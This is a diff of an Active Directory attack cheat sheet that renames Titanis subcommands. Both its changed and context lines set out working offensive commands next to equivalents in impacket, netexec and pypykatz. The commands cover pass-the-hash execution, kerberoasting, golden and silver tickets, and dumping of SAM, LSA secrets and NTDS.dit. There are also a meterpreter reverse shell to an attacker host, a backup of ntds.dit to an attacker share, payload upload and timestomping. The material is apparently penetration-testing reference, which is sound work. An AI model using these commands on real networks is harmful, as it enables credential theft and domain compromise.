@@ -120,7 +120,7 @@ wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami"
 netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami"
 
 # Titanis
-wmi exec 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 "whoami"
+Wmi exec 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 "whoami"
 
 # impacket — pass-the-hash
 wmiexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 "ipconfig"
@@ -129,14 +129,14 @@ wmiexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 "i
 netexec smb 192.168.1.10 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -x "ipconfig"
 
 # Titanis — pass-the-hash
-wmi exec 192.168.1.10 -UserName jdoe -UserDomain DOMAIN \
+Wmi exec 192.168.1.10 -UserName jdoe -UserDomain DOMAIN \
   -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 "ipconfig"
 
 # impacket — Kerberos
 wmiexec.py -k -no-pass DOMAIN/jdoe@dc01.domain.local "hostname"
 
 # Titanis — Kerberos
-wmi exec dc01.domain.local -UserName jdoe@DOMAIN -Kdc 192.168.1.1 -Password Password123 "hostname"
+Wmi exec dc01.domain.local -UserName jdoe@DOMAIN -Kdc 192.168.1.1 -Password Password123 "hostname"
 ```
 
 [↑ Back to Index](#index)
@@ -156,7 +156,7 @@ dcomexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 "
 netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami" --exec-method dcomexec
 
 # Titanis
-dcom invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 Win32_Process Create "whoami"
+Dcom invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 Win32_Process Create "whoami"
 ```
 
 [↑ Back to Index](#index)
@@ -183,11 +183,11 @@ msf6 exploit(psexec) > run rhosts=192.168.1.10 smbdomain=DOMAIN smbuser=jdoe \
   payload=windows/x64/meterpreter/reverse_tcp lhost=<attacker-ip>
 
 # Titanis — create service, run, retrieve output, clean up
-scm create 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc \
+Scm create 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc \
   "C:\Windows\System32\cmd.exe /c whoami > C:\Windows\Temp\out.txt" -Start
-smb2 get \\192.168.1.10\ADMIN$\Temp\out.txt out.txt -UserName jdoe@DOMAIN -Password Password123
-scm stop   192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc
-scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc
+Smb2Client get \\192.168.1.10\ADMIN$\Temp\out.txt out.txt -UserName jdoe@DOMAIN -Password Password123
+Scm stop   192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc
+Scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc mysvc
 ```
 
 [↑ Back to Index](#index)
@@ -200,14 +200,14 @@ scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -EncryptRpc 
 
 ```bash
 # Titanis — create immediate scheduled task via Win32_ScheduledJob
-wmi invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Wmi invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
   Win32_ScheduledJob Create \
   "Command='cmd /c whoami > C:\\Windows\\Temp\\out.txt',StartTime='********143000.000000+000'"
 
 # Titanis — retrieve output and clean up
-smb2 get \\192.168.1.10\C$\Windows\Temp\out.txt out.txt \
+Smb2Client get \\192.168.1.10\C$\Windows\Temp\out.txt out.txt \
   -UserName jdoe@DOMAIN -Password Password123
-smb2 rm  \\192.168.1.10\C$\Windows\Temp\out.txt \
+Smb2Client rm  \\192.168.1.10\C$\Windows\Temp\out.txt \
   -UserName jdoe@DOMAIN -Password Password123
 
 # impacket — true MS-TSCH (creates, runs, and cleans up automatically)
@@ -258,7 +258,7 @@ getTGT.py DOMAIN/jdoe:Password123 -dc-ip 192.168.1.1
 minikerberos-getTGT "kerberos+password://DOMAIN\jdoe:Password123@192.168.1.1" --ccache jdoe.ccache
 
 # Titanis — password (outputs kirbi)
-kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
+Kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
   -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi
 
 # Metasploit
@@ -273,7 +273,7 @@ getTGT.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe -dc-ip 192.168.1
 minikerberos-getTGT "kerberos+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" --ccache jdoe.ccache
 
 # Titanis — NTLM hash
-kerb asreq -UserName jdoe -Realm DOMAIN -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
+Kerb asreq -UserName jdoe -Realm DOMAIN -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
   -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi
 
 # impacket — AES256
@@ -285,7 +285,7 @@ minikerberos-getTGT \
   --ccache jdoe.ccache
 
 # Titanis — AES256
-kerb asreq -UserName jdoe -Realm DOMAIN \
+Kerb asreq -UserName jdoe -Realm DOMAIN \
   -AesKey 76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4e4 \
   -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi
 
@@ -298,7 +298,7 @@ minikerberos-getTGT \
   --ccache jdoe.ccache
 
 # Titanis — explicit RC4
-kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
+Kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
   -EncTypes Rc4Hmac -Kdc 192.168.1.1 -OutputFileName jdoe-tgt-rc4.kirbi
 ```
 
@@ -322,7 +322,7 @@ minikerberos-getTGS \
   cifs/fileserver.domain.local fileserver.ccache
 
 # Titanis
-kerb tgsreq -Kdc 192.168.1.1 -Tgt jdoe-tgt.kirbi \
+Kerb tgsreq -Kdc 192.168.1.1 -Tgt jdoe-tgt.kirbi \
   cifs/fileserver.domain.local -OutputFile jdoe-fileserver.kirbi
 ```
 
@@ -352,7 +352,7 @@ minikerberos-getS4U2proxy \
   cifs/target.domain.local s4u_self.ccache s4u_proxy.ccache
 
 # Titanis — combined self+proxy
-kerb tgsreq -Kdc 192.168.1.1 -Tgt svc-tgt.kirbi \
+Kerb tgsreq -Kdc 192.168.1.1 -Tgt svc-tgt.kirbi \
   -S4UserName Administrator@DOMAIN cifs/target.domain.local \
   -OutputFile admin-target.kirbi
 ```
@@ -401,16 +401,16 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> kerberoast kerberoast_hashes.txt
 
 # Titanis — enumerate SPNs, get TGT, loop tgsreq per SPN, extract hashes
-ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   "(servicePrincipalName=*)" -OutputFields sAMAccountName,servicePrincipalName > spns.txt
-kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
+Kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
   -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi
 while IFS= read -r spn; do
   safe=$(echo "$spn" | tr '/:@' '_')
   kerb tgsreq -Kdc 192.168.1.1 -Tgt jdoe-tgt.kirbi \
     -EncTypes Rc4Hmac "$spn" -OutputFile "roast_${safe}.kirbi"
 done < <(awk '/servicePrincipalName:/{print $2}' spns.txt)
-kerb select -From roast_*.kirbi -Into kerberoast-all.ccache
+Kerb select -From roast_*.kirbi -Into kerberoast-all.ccache
 minikerberos-ccacheroast kerberoast-all.ccache
 ```
 
@@ -453,7 +453,7 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> asrep
 
 # Titanis — find targets via LDAP, loop asreq
-ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
   "(userAccountControl|=4194304)" \
   -OutputFields sAMAccountName > asrep_targets.txt
 while IFS= read -r user; do
@@ -503,7 +503,7 @@ msf6 auxiliary(kerberos_enumusers) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL 
   user_file=/path/to/users.txt verbose=true
 
 # Titanis — single account probe
-kerb getasinfo -UserName jdoe -Realm DOMAIN -Kdc 192.168.1.1
+Kerb getasinfo -UserName jdoe -Realm DOMAIN -Kdc 192.168.1.1
 
 # Titanis — bulk probe loop
 while IFS= read -r user; do
@@ -555,7 +555,7 @@ certipy req -username jdoe@DOMAIN -password Password123 \
   -target ca.domain.local -out admin
 minikerberos-getNTPKInit \
   "kerberos+pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt
-wmi exec 192.168.1.10 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
+Wmi exec 192.168.1.10 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
 ```
 
 [↑ Back to Index](#index)
@@ -577,7 +577,7 @@ krenew -v -b -t
 minikerberos-renewTGT "kerberos+ccache://DOMAIN\jdoe:@192.168.1.1?ccache=jdoe.ccache" jdoe-renewed.ccache
 
 # Titanis
-kerb renew -Ticket jdoe-tgt.kirbi -OutputFileName jdoe-tgt-renewed.kirbi
+Kerb renew -Ticket jdoe-tgt.kirbi -OutputFileName jdoe-tgt-renewed.kirbi
 ```
 
 [↑ Back to Index](#index)
@@ -606,8 +606,8 @@ minikerberos-ccacheedit list jdoe.ccache
 minikerberos-ccacheedit delete jdoe.ccache <credential-index>
 
 # Titanis — merge multiple files
-kerb select -From jdoe.ccache
-kerb select -From jdoe*.kirbi -Into all-jdoe.ccache
+Kerb select -From jdoe.ccache
+Kerb select -From jdoe*.kirbi -Into all-jdoe.ccache
 ```
 
 [↑ Back to Index](#index)
@@ -621,7 +621,7 @@ kerb select -From jdoe*.kirbi -Into all-jdoe.ccache
 changepasswd.py -protocol kpasswd DOMAIN/jdoe:OldPass@192.168.1.1 -newpass NewPass
 
 # Titanis — change own password
-kerb changepw jdoe@DOMAIN 192.168.1.1 -Password OldPass NewPass
+Kerb changepw jdoe@DOMAIN 192.168.1.1 -Password OldPass NewPass
 
 # impacket — admin resets another user's password
 changepasswd.py -reset DOMAIN/admin:AdminPass@192.168.1.1 -newpass NewPass -altuser DOMAIN/jdoe
@@ -633,7 +633,7 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p AdminPass set password jdoe NewPas
 bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 set password jdoe NewPass
 
 # Titanis — admin sets another user's password
-kerb setpw -UserName admin@DOMAIN -Kdc 192.168.1.1 -Password AdminPass jdoe@DOMAIN NewPass
+Kerb setpw -UserName admin@DOMAIN -Kdc 192.168.1.1 -Password AdminPass jdoe@DOMAIN NewPass
 ```
 
 [↑ Back to Index](#index)
@@ -678,15 +678,15 @@ ticketer.py -nthash <krbtgt_ntlm> -domain-sid S-1-5-21-... \
   -domain DOMAIN.LOCAL Administrator
 
 # Step 3 — use forged ticket in Titanis
-wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
+Wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
   -TicketCache Administrator.ccache "whoami"
-smb2 ls \\dc01.domain.local\C$ -UserName Administrator@DOMAIN \
+Smb2Client ls \\dc01.domain.local\C$ -UserName Administrator@DOMAIN \
   -TicketCache Administrator.ccache
 
 # Silver ticket (impacket) + Titanis
 ticketer.py -nthash <service_ntlm> -domain-sid S-1-5-21-... \
   -domain DOMAIN.LOCAL -spn cifs/fileserver.domain.local Administrator
-smb2 ls \\fileserver.domain.local\C$ -UserName Administrator@DOMAIN \
+Smb2Client ls \\fileserver.domain.local\C$ -UserName Administrator@DOMAIN \
   -TicketCache Administrator.ccache
 ```
 
@@ -718,7 +718,7 @@ asmbshareenum "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.16
 asmbshareenum "smb+kerberos+ccache://DOMAIN\jdoe:@192.168.1.10/?dc=192.168.1.1&ccache=jdoe.ccache"
 
 # Titanis
-smb2 enumshares \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
+Smb2Client enumshares \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
 
 [↑ Back to Index](#index)
@@ -741,8 +741,8 @@ asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 asmbclient "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"
 
 # Titanis
-smb2 ls \\192.168.1.10\Share -UserName jdoe -UserDomain DOMAIN -Password Password123
-smb2 ls \\192.168.1.10\C$   -UserName jdoe -UserDomain DOMAIN -Password Password123
+Smb2Client ls \\192.168.1.10\Share -UserName jdoe -UserDomain DOMAIN -Password Password123
+Smb2Client ls \\192.168.1.10\C$   -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
 
 [↑ Back to Index](#index)
@@ -769,7 +769,7 @@ asmbgetfile "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.
   -o hosts.txt
 
 # Titanis
-smb2 get \\192.168.1.10\C$\Windows\System32\drivers\etc\hosts hosts.txt \
+Smb2Client get \\192.168.1.10\C$\Windows\System32\drivers\etc\hosts hosts.txt \
   -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
 
@@ -783,7 +783,7 @@ For locked or protected files (NTDS.dit, SYSTEM hive, etc.).
 
 ```bash
 # Titanis
-smb2 get \\192.168.1.10\C$\Windows\NTDS\ntds.dit ntds.dit \
+Smb2Client get \\192.168.1.10\C$\Windows\NTDS\ntds.dit ntds.dit \
   -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics
 ```
 
@@ -803,7 +803,7 @@ smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
   -c 'put payload.exe Windows\Temp\payload.exe'
 
 # Titanis
-smb2 put payload.exe \\192.168.1.10\C$\Windows\Temp\payload.exe \
+Smb2Client put payload.exe \\192.168.1.10\C$\Windows\Temp\payload.exe \
   -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
 
@@ -826,9 +826,9 @@ smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' -c 'rmdir Windows\Temp\
 smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' -c 'del Windows\Temp\file.txt'
 
 # Titanis
-smb2 mkdir \\192.168.1.10\C$\Windows\Temp\newdir  -UserName jdoe -UserDomain DOMAIN -Password Password123
-smb2 rmdir \\192.168.1.10\C$\Windows\Temp\newdir  -UserName jdoe -UserDomain DOMAIN -Password Password123
-smb2 rm    \\192.168.1.10\C$\Windows\Temp\file.txt -UserName jdoe -UserDomain DOMAIN -Password Password123
+Smb2Client mkdir \\192.168.1.10\C$\Windows\Temp\newdir  -UserName jdoe -UserDomain DOMAIN -Password Password123
+Smb2Client rmdir \\192.168.1.10\C$\Windows\Temp\newdir  -UserName jdoe -UserDomain DOMAIN -Password Password123
+Smb2Client rm    \\192.168.1.10\C$\Windows\Temp\file.txt -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
 
 [↑ Back to Index](#index)
@@ -847,7 +847,7 @@ smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
 netexec smb 192.168.1.10 -u jdoe -p Password123 --pipe
 
 # Titanis
-smb2 ls \\192.168.1.10\IPC$ -UserName jdoe -UserDomain DOMAIN -Password Password123
+Smb2Client ls \\192.168.1.10\IPC$ -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
 
 [↑ Back to Index](#index)
@@ -867,7 +867,7 @@ netexec smb 192.168.1.10 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5
 asmbclient "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"
 
 # Titanis
-smb2 ls \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN \
+Smb2Client ls \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN \
   -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5
 ```
 
@@ -888,7 +888,7 @@ asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10/?proxyhost=
 asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10/?proxytype=socks4&proxyhost=127.0.0.1&proxyport=1080"
 
 # Titanis
-smb2 ls \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN -Password Password123 \
+Smb2Client ls \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   -Socks5 127.0.0.1:1080
 ```
 
@@ -909,8 +909,8 @@ asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 # smb> files
 
 # Titanis
-smb2 enumopenfiles \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
-smb2 enumsessions  \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
+Smb2Client enumopenfiles \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
+Smb2Client enumsessions  \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
 
 [↑ Back to Index](#index)
@@ -925,7 +925,7 @@ smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN \
   touch --time "2022-01-01 00:00:00" C$/Windows/Temp/payload.exe
 
 # Titanis
-smb2 touch \\192.168.1.10\C$\Windows\Temp\payload.exe \
+Smb2Client touch \\192.168.1.10\C$\Windows\Temp\payload.exe \
   -UserName jdoe -UserDomain DOMAIN -Password Password123 -Time "2022-01-01 00:00:00"
 ```
 
@@ -944,7 +944,7 @@ smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
 smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN snapshots C$
 
 # Titanis
-smb2 enumsnapshots \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN -Password Password123
+Smb2Client enumsnapshots \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
 
 [↑ Back to Index](#index)
@@ -963,7 +963,7 @@ smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN \
   streams C$/Windows/Temp/file.txt
 
 # Titanis
-smb2 enumstreams \\192.168.1.10\C$\Windows\Temp\file.txt \
+Smb2Client enumstreams \\192.168.1.10\C$\Windows\Temp\file.txt \
   -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
 
@@ -981,7 +981,7 @@ netexec smb 192.168.1.10 -u jdoe -p Password123 --interfaces
 smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN nics
 
 # Titanis
-smb2 enumnics \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
+Smb2Client enumnics \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
 ```
 
 [↑ Back to Index](#index)
@@ -1069,10 +1069,10 @@ pypykatz smb regdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 pypykatz smb regdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10" --sam
 
 # Titanis
-reg dumpsam 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
+Reg dumpsam 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
 
 # Titanis — backup operator (no admin required)
-reg dumpsam 192.168.1.10 -UserName backupuser@DOMAIN \
+Reg dumpsam 192.168.1.10 -UserName backupuser@DOMAIN \
   -Password Password123 -BackupSemantics
 ```
 
@@ -1103,7 +1103,7 @@ pypykatz smb regdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 pypykatz smb regdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10" --lsa
 
 # Titanis
-reg dumplsasecrets 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
+Reg dumplsasecrets 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
 ```
 
 [↑ Back to Index](#index)
@@ -1136,8 +1136,8 @@ pypykatz smb lsassdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B
 pypykatz smb secretsdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 
 # Titanis
-reg dumpsam        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
-reg dumplsasecrets 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
+Reg dumpsam        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
+Reg dumplsasecrets 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
 ```
 
 [↑ Back to Index](#index)
@@ -1210,11 +1210,11 @@ netexec smb 192.168.1.1 -u Administrator -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 --n
 netexec smb 192.168.1.1 -u Administrator -p Password123 --ntds vss --enabled
 
 # Titanis — manual VSS: enumerate existing snapshots, pull files with backup semantics, parse offline
-smb2 enumsnapshots \\192.168.1.1\C$ -UserName Administrator@DOMAIN -Password Password123
+Smb2Client enumsnapshots \\192.168.1.1\C$ -UserName Administrator@DOMAIN -Password Password123
 # Use snapshot path from output, e.g. @GMT-2024.01.01-00.00.00
-smb2 get "\\192.168.1.1\C$\@GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit" ntds.dit \
+Smb2Client get "\\192.168.1.1\C$\@GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit" ntds.dit \
   -UserName Administrator@DOMAIN -Password Password123 -BackupSemantics
-smb2 get "\\192.168.1.1\C$\@GMT-2024.01.01-00.00.00\Windows\System32\config\SYSTEM" SYSTEM \
+Smb2Client get "\\192.168.1.1\C$\@GMT-2024.01.01-00.00.00\Windows\System32\config\SYSTEM" SYSTEM \
   -UserName Administrator@DOMAIN -Password Password123 -BackupSemantics
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
@@ -1243,14 +1243,14 @@ netexec smb 192.168.1.1 -u Administrator -p Password123 -M ntdsutil
 netexec smb 192.168.1.1 -u Administrator -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -M ntdsutil
 
 # Titanis — exec via WMI, retrieve via SMB, parse offline
-wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
+Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
   "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ifm\" q q"
-smb2 get "\\192.168.1.1\C$\Windows\Temp\ifm\Active Directory\ntds.dit" ntds.dit \
+Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ifm\Active Directory\ntds.dit" ntds.dit \
   -UserName Administrator@DOMAIN -Password Password123
-smb2 get "\\192.168.1.1\C$\Windows\Temp\ifm\registry\SYSTEM" SYSTEM \
+Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ifm\registry\SYSTEM" SYSTEM \
   -UserName Administrator@DOMAIN -Password Password123
 # Clean up
-smb2 rmdir "\\192.168.1.1\C$\Windows\Temp\ifm" \
+Smb2Client rmdir "\\192.168.1.1\C$\Windows\Temp\ifm" \
   -UserName Administrator@DOMAIN -Password Password123
 
 # Parse offline
@@ -1272,7 +1272,7 @@ wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
   "wbadmin start backup -backupTarget:\\\\<attacker-ip>\\share -include:C:\\Windows\\NTDS\\ntds.dit -quiet"
 
 # Titanis — exec via WMI
-wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
+Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
   "wbadmin start backup -backupTarget:\\\\<attacker-ip>\\share -include:C:\\Windows\\NTDS\\ntds.dit -quiet"
 
 # Step 2 — list backup versions to get the version identifier
@@ -1288,9 +1288,9 @@ wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
   "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM"
 
 # Step 5 — retrieve both files and parse offline
-smb2 get "\\192.168.1.1\C$\Windows\Temp\ntds.dit" ntds.dit \
+Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ntds.dit" ntds.dit \
   -UserName Administrator@DOMAIN -Password Password123
-smb2 get "\\192.168.1.1\C$\Windows\Temp\SYSTEM" SYSTEM \
+Smb2Client get "\\192.168.1.1\C$\Windows\Temp\SYSTEM" SYSTEM \
   -UserName Administrator@DOMAIN -Password Password123
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
@@ -1319,7 +1319,7 @@ smbclient.py DOMAIN/Administrator:Password123@192.168.1.1
 # smb: \> put shadow.dsh Windows\Temp\shadow.dsh
 
 # Titanis — upload
-smb2 put shadow.dsh "\\192.168.1.1\C$\Windows\Temp\shadow.dsh" \
+Smb2Client put shadow.dsh "\\192.168.1.1\C$\Windows\Temp\shadow.dsh" \
   -UserName Administrator@DOMAIN -Password Password123
 
 # Step 3 — execute diskshadow and copy NTDS.dit
@@ -1331,11 +1331,11 @@ wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
   "cmd.exe /c copy Z:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM"
 
 # Titanis — exec
-wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
+Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
   "diskshadow.exe /s C:\Windows\Temp\shadow.dsh"
-wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
+Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
   "cmd.exe /c copy Z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit"
-wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
+Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
   "cmd.exe /c copy Z:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM"
 
 # Step 4 — retrieve files
@@ -1344,9 +1344,9 @@ smbclient.py DOMAIN/Administrator:Password123@192.168.1.1
 # smb: \> get Windows\Temp\SYSTEM SYSTEM
 
 # Titanis — retrieve
-smb2 get "\\192.168.1.1\C$\Windows\Temp\ntds.dit" ntds.dit \
+Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ntds.dit" ntds.dit \
   -UserName Administrator@DOMAIN -Password Password123
-smb2 get "\\192.168.1.1\C$\Windows\Temp\SYSTEM" SYSTEM \
+Smb2Client get "\\192.168.1.1\C$\Windows\Temp\SYSTEM" SYSTEM \
   -UserName Administrator@DOMAIN -Password Password123
 
 # Step 5 — clean up and parse offline
@@ -1393,7 +1393,7 @@ gosecretsdump -ntds ntds.dit -system SYSTEM -history   # include password histor
 gosecretsdump -ntds ntds.dit -system SYSTEM -out hashes.txt
 
 # Titanis — PTH with recovered hash
-wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
+Wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
   -NtlmHash <recovered_ntlm> "whoami"
 ```
 
@@ -1444,7 +1444,7 @@ netexec smb 192.168.1.1 -u Administrator -p Password123 --ntds --user krbtgt
 netexec smb 192.168.1.1 -u Administrator -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 --ntds
 
 # Titanis — PTH with recovered hash
-wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
+Wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
   -NtlmHash <recovered_ntlm> "whoami"
 ```
 
@@ -1475,7 +1475,7 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> adinfo
 
 # Titanis
-sam enumusers 192.168.1.10 -UserName jdoe -Password Password123
+Sam enumusers 192.168.1.10 -UserName jdoe -Password Password123
 ```
 
 [↑ Back to Index](#index)
@@ -1515,8 +1515,8 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 get search \
   --filter "(objectClass=group)" --attr sAMAccountName,description,member
 
 # Titanis
-sam enumgroups  192.168.1.10 -UserName jdoe -Password Password123
-sam enumaliases 192.168.1.10 -UserName jdoe -Password Password123
+Sam enumgroups  192.168.1.10 -UserName jdoe -Password Password123
+Sam enumaliases 192.168.1.10 -UserName jdoe -Password Password123
 ```
 
 [↑ Back to Index](#index)
@@ -1536,11 +1536,11 @@ netexec smb 192.168.1.10 -u jdoe -p Password123 --rid-brute
 enum4linux-ng -R 192.168.1.10 -u jdoe -p Password123
 
 # Titanis — resolve SID
-lsa lookupsid 192.168.1.10 -UserName jdoe -Password Password123 \
+Lsa lookupsid 192.168.1.10 -UserName jdoe -Password Password123 \
   S-1-5-21-1234567890-1234567890-1234567890-500
 
 # Titanis — name to SID
-lsa lookupname 192.168.1.10 -UserName jdoe -Password Password123 Administrator jdoe
